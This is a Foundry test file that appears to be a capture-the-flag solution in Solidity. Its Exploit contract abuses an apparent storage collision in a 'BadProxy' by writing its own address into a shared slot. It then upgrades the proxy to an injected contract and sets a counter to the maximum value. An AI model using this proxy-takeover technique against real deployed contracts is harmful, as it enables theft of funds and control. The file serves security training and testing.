// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./Challenge.sol";

contract ChallengeTest is Test {
    Setup setup;
    address public playerAddress;

    function setUp() public {
        playerAddress = makeAddr("player");
        setup = new Setup();
        vm.deal(playerAddress, 1 ether);
    }

    function testExploit() public {
        vm.startPrank(playerAddress, playerAddress);

        ////////// YOUR CODE GOES HERE //////////
        new Exploit(setup).execute();
        ////////// YOUR CODE END //////////

        assertTrue(setup.isSolved(), "challenge not solved");
        vm.stopPrank();
    }
}

////////// YOUR CODE GOES HERE //////////
contract Exploit {
    Setup setup;

    constructor(Setup setup_) {
        setup = setup_;
    }

    function execute() external {
        setup.counter().setNumber(uint256(uint160(address(this))));

        InjectContract injectContract = new InjectContract();

        BadProxy(address(setup.counter())).upgradeTo(address(injectContract));
        InjectContract(address(setup.counter())).setMaxValue();
    }
}

contract InjectContract {
    uint256 public number;

    function setMaxValue() external {
        number = type(uint256).max;
    }
}
////////// YOUR CODE END //////////
